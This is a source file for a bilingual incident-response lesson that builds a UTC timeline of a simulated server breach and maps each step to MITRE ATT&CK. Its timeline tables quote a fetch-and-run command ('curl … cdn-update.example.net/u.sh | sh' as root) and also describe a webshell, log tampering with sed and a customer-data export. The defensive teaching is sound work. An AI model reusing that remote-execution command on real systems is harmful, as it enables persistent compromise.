/**
 * 18.4 — Dòng thời gian + ATT&CK (soạn 24/11/2026, agent lgz). Output thật: OUT['s18/dong-thoi-gian'] — công cụ _demo/s18/mau/dong-thoi-gian18.py (đọc 8 nguồn qua nguon18.py)
 * trên bộ su-co18; bảng _demo/s18/mau/attack-su-co18.tsv (19 kỹ thuật, số kiểm attack.mitre.org 24/11/2026, v19.2) + lệnh đếm bằng chứng cho từng kỹ thuật.
 * Số: 443 bản ghi → 44 hàng (journal! 132 = dòng chỉ còn trong journal); cặp SPT 37255: lệch 0 ⇒ router 15:54:53Z trước Windows 15:56:30Z, lệch 97 ⇒ cùng 15:56:30Z.
 */
import { lenh, ma, nguon, lienKet, kv } from '../_chung.mjs';

const BANG_EN = [
  ['14:48–14:55Z', 'nginx + app + pg', 'sqlmap 46 requests, all blocked or harmless; no SQL error', 'T1595.002', 'High'],
  ['15:03–15:37Z', 'journal', 'SSH password spraying from 203.0.113.50–52, 12 accounts × 3', 'T1110.003', 'High'],
  ['15:34:17Z', 'journal (missing in auth.log)', 'Accepted password for deploy from .52 (tool), disconnect', 'T1078.003, T1133', 'High'],
  ['15:41:07Z', 'journal (missing in auth.log)', 'Accepted password for deploy from 198.51.100.77 (operator)', 'T1078.003', 'High'],
  ['15:42:31Z', 'auth.log + journal', 'sudo refused: deploy NOT in sudoers', '—', 'High'],
  ['15:44:30–16:21:40Z', 'journal', 'Container b0a903430d8b runs (deploy is in group docker) ⇒ root on host', 'T1611', 'High (via Docker) / Medium (exact command)'],
  ['15:47:12Z / 15:48:01Z', 'thu-thap/cron.d.txt + syslog', '/etc/cron.d/apt-compat created / loaded', 'T1053.003, T1036.005', 'High'],
  ['15:50:01Z → 02:00:01Z (23/11)', 'syslog', 'curl … cdn-update.example.net/u.sh | sh as root, 206 runs; effect unknown', 'T1105', 'High (runs) / Unknown (effect)'],
  ['15:52:40Z', 'rt01 (+97 s)', 'Reverse DNS sweep of 10.20.0.0/24 from 10.8.0.1: 5 names', 'T1018', 'High'],
  ['15:55:10Z', 'rt01 (+97 s)', 'SYN 445/3389/22 to .15 .16 .20', 'T1046', 'High'],
  ['15:56:30–15:58:06Z', 'PC-DEV01 + rt01', 'SMB guessing: Administrator, admin, hoasen, minh × 12; 4740 at 15:57:53Z; no success', 'T1110.001', 'High'],
  ['16:05:44Z', 'thu-thap/stat.txt', 'cache.php born (mtime faked to 02/11)', 'T1505.003, T1070.006', 'High'],
  ['16:06:02Z', 'nginx', 'First request to cache.php from 198.51.100.77', 'T1505.003', 'High'],
  ['16:19:55Z', 'stat.txt + journal vs auth.log', 'auth.log rewritten (sed -i); lines lost until 17:00:02Z', 'T1685.006', 'High'],
  ['16:22:10Z', 'journal', 'deploy SSH session ends', '—', 'High'],
  ['19:10:05–19:31:20Z', 'nginx + error.log', '10 POSTs to the web shell (parameter c)', 'T1505.003', 'High'],
  ['19:13:39Z', 'pg', 'FATAL: password for postgres', 'T1110.001', 'High'],
  ['19:14:18–19:14:27Z', 'pg', 'tour_app via psql from the host: COPY khach_hang (passport numbers) 8.4 s', 'T1552.001, T1213.006', 'High'],
  ['19:19:12Z', 'nginx', 'kh.csv.gz 3 486 215 bytes downloaded by 198.51.100.77', 'T1560.001, T1041', 'High'],
  ['19:21:40Z', 'nginx', 'Same URL → 404 (file deleted)', 'T1070.004', 'High'],
  ['23/11 01:33Z', 'PC-DEV01 report', 'Morning report shows 4740 ⇒ investigation starts', '—', '—'],
];
const BANG_VI = [
  ['14:48–14:55Z', 'nginx + app + pg', 'sqlmap 46 request, đều bị chặn hoặc vô hại; không có lỗi SQL', 'T1595.002', 'Cao'],
  ['15:03–15:37Z', 'journal', 'Rải mật khẩu SSH từ 203.0.113.50–52, 12 tài khoản × 3', 'T1110.003', 'Cao'],
  ['15:34:17Z', 'journal (mất trong auth.log)', 'Accepted password cho deploy từ .52 (công cụ), ngắt ngay', 'T1078.003, T1133', 'Cao'],
  ['15:41:07Z', 'journal (mất trong auth.log)', 'Accepted password cho deploy từ 198.51.100.77 (người điều khiển)', 'T1078.003', 'Cao'],
  ['15:42:31Z', 'auth.log + journal', 'sudo bị từ chối: deploy NOT in sudoers', '—', 'Cao'],
  ['15:44:30–16:21:40Z', 'journal', 'Container b0a903430d8b chạy (deploy thuộc nhóm docker) ⇒ root trên máy', 'T1611', 'Cao (qua Docker) / Trung bình (lệnh cụ thể)'],
  ['15:47:12Z / 15:48:01Z', 'thu-thap/cron.d.txt + syslog', 'Tạo / nạp /etc/cron.d/apt-compat', 'T1053.003, T1036.005', 'Cao'],
  ['15:50:01Z → 02:00:01Z (23/11)', 'syslog', 'curl … cdn-update.example.net/u.sh | sh bằng root, 206 lần; tác dụng chưa rõ', 'T1105', 'Cao (số lần) / Chưa rõ (tác dụng)'],
  ['15:52:40Z', 'rt01 (+97 s)', 'Dò DNS ngược cả 10.20.0.0/24 từ 10.8.0.1: 5 tên', 'T1018', 'Cao'],
  ['15:55:10Z', 'rt01 (+97 s)', 'SYN 445/3389/22 tới .15 .16 .20', 'T1046', 'Cao'],
  ['15:56:30–15:58:06Z', 'PC-DEV01 + rt01', 'Đoán mật khẩu SMB: Administrator, admin, hoasen, minh × 12; 4740 lúc 15:57:53Z; không thành công', 'T1110.001', 'Cao'],
  ['16:05:44Z', 'thu-thap/stat.txt', 'cache.php được tạo (mtime bị sửa về 02/11)', 'T1505.003, T1070.006', 'Cao'],
  ['16:06:02Z', 'nginx', 'Request đầu tiên tới cache.php từ 198.51.100.77', 'T1505.003', 'Cao'],
  ['16:19:55Z', 'stat.txt + journal so với auth.log', 'auth.log bị ghi lại (sed -i); mất dòng tới 17:00:02Z', 'T1685.006', 'Cao'],
  ['16:22:10Z', 'journal', 'Phiên SSH của deploy kết thúc', '—', 'Cao'],
  ['19:10:05–19:31:20Z', 'nginx + error.log', '10 POST vào webshell (tham số c)', 'T1505.003', 'Cao'],
  ['19:13:39Z', 'pg', 'FATAL: sai mật khẩu postgres', 'T1110.001', 'Cao'],
  ['19:14:18–19:14:27Z', 'pg', 'tour_app qua psql từ chính máy chủ: COPY khach_hang (có số hộ chiếu) 8,4 giây', 'T1552.001, T1213.006', 'Cao'],
  ['19:19:12Z', 'nginx', 'kh.csv.gz 3 486 215 byte bị 198.51.100.77 tải về', 'T1560.001, T1041', 'Cao'],
  ['19:21:40Z', 'nginx', 'Cùng URL → 404 (tệp đã xoá)', 'T1070.004', 'Cao'],
  ['23/11 01:33Z', 'báo cáo PC-DEV01', 'Báo cáo buổi sáng có 4740 ⇒ bắt đầu điều tra', '—', '—'],
];
const bang = (rows, h) => `<table>\n<thead><tr>${h.map((x) => `<th>${x}</th>`).join('')}</tr></thead>\n<tbody>\n${rows.map((r) => `<tr>${r.map((x) => `<td>${x}</td>`).join('')}</tr>`).join('\n')}\n</tbody></table>`;

export default {
  title: '18.4 — Step 3 — Build the timeline and map every step to MITRE ATT&CK|||18.4 — Bước 3 — Dựng dòng thời gian và gắn từng bước vào MITRE ATT&CK',
  slug: 'log-18-4-dong-thoi-gian',
  type: 'LESSON',
  isFreePreview: true,
  description: 'Gom mọi câu trả lời của 18.3 thành một dòng thời gian UTC duy nhất: công cụ dong-thoi-gian18.py đọc tám nguồn, sửa lệch router, đánh dấu những dòng chỉ còn trong journal, gộp hàng lặp — 443 bản ghi thành 44 hàng; thấy tận mắt thứ tự sự việc sai thế nào khi quên sửa lệch 97 giây; bảng dòng thời gian 21 hàng có độ tin cậy; gắn 19 kỹ thuật ATT&CK v19.2 (số kiểm trên attack.mitre.org) và kiểm mỗi kỹ thuật đều có ít nhất một dòng log làm bằng chứng; cuối cùng là danh sách log lẽ ra phải có.',
  content: `
<div class="ml-en">
<span class="eyebrow">Chapter 18 · Capstone · 18.4</span>
<h2>One clock, one table, nineteen techniques</h2>
<p class="lead">In 18.3 you answered questions one by one. Managers, lawyers and the next analyst do not read 15 answers — they read <strong>one timeline</strong>. This step builds it automatically from the indicators you found, then turns it into the table that goes into the report, with an ATT&amp;CK ID and a confidence for each row.</p>

<h3>The everyday picture</h3>
<p>A football match report: not "what each player did", but minute by minute — 12' foul, 15' yellow card, 31' goal — with the camera angle that proves each one.</p>

<h3>1. Build it from the indicators</h3>
<details><summary><strong>dong-thoi-gian18.py (≈ 35 lines, uses nguon18.py from 18.2)</strong></summary>
${ma('python', 's18/mau/dong-thoi-gian18.py')}
</details>
${lenh('s18/dong-thoi-gian', 0)}
<p>Read the second column: <code>journal!</code> marks 132 records that exist <em>only</em> in the journal — every one of them was cut out of auth.log. The <code>[×n tới …]</code> groups keep the spray, the cron runs and the SMB attempts to one row each.</p>

<h3>2. What the router skew would have done</h3>
${lenh('s18/dong-thoi-gian', 1)}
<p>Same TCP connection (source port 37255). Without correction the router puts the SYN 97 seconds <em>before</em> Windows saw the logon attempt — a careless timeline would show "port 445 probed, then 1.5 minutes later the first logon" and you would invent a pause that never happened.</p>

<h3>3. The incident timeline (deliverable)</h3>
${bang(BANG_EN, ['Time (UTC, 21–22/11/2026)', 'Source', 'Event', 'ATT&amp;CK', 'Confidence'])}

<h3>4. ATT&amp;CK mapping — and proof for every technique</h3>
${lenh('s18/dong-thoi-gian', 2)}
${lenh('s18/dong-thoi-gian', 3)}
<p>Every technique has at least one matching log line (or admin-collected output). If a count were 0, the mapping would be a guess — remove it or mark it "suspected". IDs were checked on attack.mitre.org on 24/11/2026 (v19.2): note <strong>T1685.006</strong> (formerly T1070.002) and the tactic names <em>Stealth</em> and <em>Defense Impairment</em>.</p>
${nguon('📘', 'MITRE ATT&CK — Enterprise matrix (v19.2)', '15 tactics, techniques, detection strategies', 'https://attack.mitre.org/')}

<h3>5. Logs that should have existed</h3>
${kv([
  ['auditd on vps01', 'Would show <code>docker run</code> arguments, the <code>sed -i</code> on auth.log, writes to /etc/cron.d — turning "Medium" rows into "High".'],
  ['Central log server', 'A copy of auth.log on another machine survives <code>sed</code> (Chapter 8 rsyslog forwarding, Chapter 15).'],
  ['DNS + egress on vps01', 'What <code>u.sh</code> fetched, 206 times — currently unknown.'],
  ['PHP-FPM / request bodies', 'Commands sent through <code>c=</code>; at least log the length and a hash.'],
  ['pgAudit on khach_hang', 'Any read of the customer table, regardless of duration.'],
  ['Docker events / daemon audit', '<code>docker events</code> shipped to the log server.'],
])}

<h3>🛡️ Attacker's corner</h3>
<p>The attacker deleted lines by IP, but forgot the lines that do not contain an IP, forgot that journald keeps its own copy, and forgot that rsyslog keeps writing to the old inode. Selective deletion almost always leaves a shape — which is why investigators look at counts, pairs and gaps, not only at contents.</p>

<h3>🎤 What an interviewer will ask</h3>
<ul>
<li>"What goes in each row of a timeline?" — UTC time, source, event, evidence pointer, ATT&amp;CK, confidence.</li>
<li>"Why does ATT&amp;CK mapping need evidence per technique?" — otherwise the report claims things you cannot show; and detection engineers use it to build rules.</li>
<li>"Which single log source would have helped most here?" — a reasoned answer (e.g. auditd + central copy) is what they want.</li>
</ul>

<h3>At work</h3>
<p>In an incident call, the timeline is a shared document everyone edits live. Keep it UTC, one event per row, and never delete a row that turned out wrong — strike it through and say why.</p>

<h3>🧪 Practice (45 min)</h3>
<ol>
<li>Run the tool with only <code>198.51.100.77</code>. What does that one IP tell the story of — and what does it miss?</li>
<li>Add the Monday rows (An's SSH login and sudo commands, from the journal) to your table.</li>
<li>Draw the attack as a chain of ATT&amp;CK tactics (Reconnaissance → … → Exfiltration) on one slide.</li>
</ol>

<h3>🗂 Key terms</h3>
${kv([
  ['Timeline', 'Ordered events on one clock, each with evidence.'],
  ['Confidence', 'How directly the evidence supports the row.'],
  ['Coverage check', 'Verifying each mapped technique has at least one evidence line.'],
  ['Visibility gap', 'Something you could not answer because no log recorded it.'],
])}

<h3>📌 Summary</h3>
<ul>
<li>Generate the timeline from indicators, correct skew, mark what exists only in one copy.</li>
<li>21 rows, 19 techniques, each with proof; unknowns written down.</li>
<li>Next: 18.5 turns this into a report and a five-minute presentation.</li>
</ul>
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-14-6-mitre-attack', title: 'Lesson 14.6 — MITRE ATT&CK v19.2', sub: 'Tactics, techniques, detection strategies', cta: 'Open' })}
${lienKet({ khoa: 'incident-response', bai: 'ir-4-5-dong-thoi-gian', title: 'Incident Response course › 4.5 Live timeline', sub: 'Keeping the timeline during the incident', cta: 'Open' })}
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 18 · Dự án cuối khoá · 18.4</span>
<h2>Một đồng hồ, một bảng, mười chín kỹ thuật</h2>
<p class="lead">Ở 18.3 bạn trả lời từng câu một. Giám đốc, luật sư và người điều tra kế tiếp không đọc 15 câu trả lời — họ đọc <strong>một dòng thời gian</strong>. Bước này dựng nó tự động từ các dấu hiệu bạn đã tìm, rồi chuyển thành bảng đưa vào báo cáo, mỗi hàng có số ATT&amp;CK và độ tin cậy.</p>

<h3>Liên tưởng đời thường</h3>
<p>Bản tường thuật trận bóng: không kể "từng cầu thủ làm gì", mà theo phút — phút 12 phạm lỗi, phút 15 thẻ vàng, phút 31 bàn thắng — kèm góc máy quay chứng minh từng tình huống.</p>

<h3>1. Dựng từ các dấu hiệu</h3>
<details><summary><strong>dong-thoi-gian18.py (≈ 35 dòng, dùng nguon18.py của 18.2)</strong></summary>
${ma('python', 's18/mau/dong-thoi-gian18.py')}
</details>
${lenh('s18/dong-thoi-gian', 0)}
<p>Đọc cột thứ hai: <code>journal!</code> đánh dấu 132 bản ghi <em>chỉ</em> còn trong journal — tất cả đều đã bị cắt khỏi auth.log. Nhóm <code>[×n tới …]</code> giữ đợt rải mật khẩu, các lần cron chạy và các lần thử SMB mỗi thứ một hàng.</p>

<h3>2. Nếu quên sửa lệch đồng hồ router</h3>
${lenh('s18/dong-thoi-gian', 1)}
<p>Cùng một kết nối TCP (cổng nguồn 37255). Không sửa thì router đặt gói SYN <em>trước</em> lúc Windows thấy lần thử đăng nhập tới 97 giây — một dòng thời gian cẩu thả sẽ ghi "dò cổng 445, 1,5 phút sau mới thử đăng nhập lần đầu" và bạn bịa ra một quãng nghỉ không hề có.</p>

<h3>3. Dòng thời gian của vụ việc (sản phẩm nộp)</h3>
${bang(BANG_VI, ['Thời điểm (UTC, 21–22/11/2026)', 'Nguồn', 'Sự việc', 'ATT&amp;CK', 'Độ tin cậy'])}

<h3>4. Gắn ATT&amp;CK — và bằng chứng cho từng kỹ thuật</h3>
${lenh('s18/dong-thoi-gian', 2)}
${lenh('s18/dong-thoi-gian', 3)}
<p>Kỹ thuật nào cũng có ít nhất một dòng log khớp (hoặc output quản trị viên thu được). Nếu số đếm là 0, việc gắn là đoán — bỏ đi hoặc ghi "nghi ngờ". Số hiệu kiểm trên attack.mitre.org ngày 24/11/2026 (v19.2): chú ý <strong>T1685.006</strong> (số cũ T1070.002) và tên chiến thuật <em>Stealth</em>, <em>Defense Impairment</em>.</p>
${nguon('📘', 'MITRE ATT&CK — ma trận Enterprise (v19.2)', '15 chiến thuật, kỹ thuật, chiến lược phát hiện', 'https://attack.mitre.org/')}

<h3>5. Log lẽ ra phải có</h3>
${kv([
  ['auditd trên vps01', 'Sẽ cho thấy tham số <code>docker run</code>, lệnh <code>sed -i</code> vào auth.log, việc ghi vào /etc/cron.d — biến các hàng "Trung bình" thành "Cao".'],
  ['Máy chủ log tập trung', 'Bản sao auth.log ở máy khác sống sót qua <code>sed</code> (rsyslog chuyển tiếp ở Chương 8, Chương 15).'],
  ['DNS + lưu lượng ra của vps01', '<code>u.sh</code> đã tải gì về, 206 lần — hiện chưa biết.'],
  ['PHP-FPM / thân request', 'Lệnh gửi qua <code>c=</code>; ít nhất ghi độ dài và mã băm.'],
  ['pgAudit cho khach_hang', 'Mọi lần đọc bảng khách hàng, bất kể nhanh hay chậm.'],
  ['Docker events / audit daemon', '<code>docker events</code> gửi về máy chủ log.'],
])}

<h3>🛡️ Góc hacker</h3>
<p>Kẻ tấn công xoá dòng theo IP, nhưng quên những dòng không chứa IP, quên journald giữ bản riêng, và quên rsyslog vẫn ghi vào inode cũ. Xoá có chọn lọc gần như luôn để lại "hình dạng" — vì thế người điều tra nhìn số đếm, cặp dòng và khoảng trống, chứ không chỉ nội dung.</p>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ul>
<li>"Mỗi hàng của dòng thời gian gồm gì?" — giờ UTC, nguồn, sự việc, chỗ có bằng chứng, ATT&amp;CK, độ tin cậy.</li>
<li>"Sao gắn ATT&amp;CK phải có bằng chứng từng kỹ thuật?" — không thì báo cáo khẳng định điều bạn không chỉ ra được; và người viết luật phát hiện dựa vào nó để làm luật.</li>
<li>"Ở vụ này, nguồn log nào giúp được nhiều nhất?" — họ muốn một câu trả lời có lập luận (vd auditd + bản tập trung).</li>
</ul>

<h3>Đi làm thật (outsourcing / OJT)</h3>
<p>Trong cuộc gọi xử lý sự cố, dòng thời gian là tài liệu chung mọi người sửa trực tiếp. Giữ UTC, mỗi hàng một sự việc, và đừng xoá hàng nào hoá ra sai — gạch ngang và ghi lý do.</p>

<h3>🧪 Thực hành (45 phút)</h3>
<ol>
<li>Chạy công cụ chỉ với <code>198.51.100.77</code>. Một IP ấy kể được câu chuyện nào — và bỏ sót gì?</li>
<li>Thêm các hàng sáng thứ Hai (An đăng nhập SSH và các lệnh sudo, lấy từ journal) vào bảng của bạn.</li>
<li>Vẽ cuộc tấn công thành chuỗi chiến thuật ATT&amp;CK (Reconnaissance → … → Exfiltration) trên một slide.</li>
</ol>

<h3>🗂 Thuật ngữ</h3>
${kv([
  ['Dòng thời gian', 'Các sự việc xếp theo một đồng hồ, mỗi việc có bằng chứng.'],
  ['Độ tin cậy', 'Bằng chứng ủng hộ hàng đó trực tiếp tới mức nào.'],
  ['Kiểm độ phủ', 'Xác nhận mỗi kỹ thuật đã gắn có ít nhất một dòng bằng chứng.'],
  ['Khoảng mù (visibility gap)', 'Điều không trả lời được vì không có log nào ghi lại.'],
])}

<h3>📌 Tóm tắt</h3>
<ul>
<li>Sinh dòng thời gian từ dấu hiệu, sửa lệch đồng hồ, đánh dấu thứ chỉ còn ở một bản.</li>
<li>21 hàng, 19 kỹ thuật, kỹ thuật nào cũng có bằng chứng; điều chưa biết được ghi ra.</li>
<li>Tiếp theo: 18.5 biến tất cả thành báo cáo và bài trình bày năm phút.</li>
</ul>
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-14-6-mitre-attack', title: 'Bài 14.6 — MITRE ATT&CK v19.2', sub: 'Chiến thuật, kỹ thuật, chiến lược phát hiện', cta: 'Mở bài' })}
${lienKet({ khoa: 'incident-response', bai: 'ir-4-5-dong-thoi-gian', title: 'Khoá Incident Response › 4.5 Ghi dòng thời gian ngay lúc xảy ra', sub: 'Viết dòng thời gian trong lúc xử lý', cta: 'Mở bài' })}
</div>
`,
};
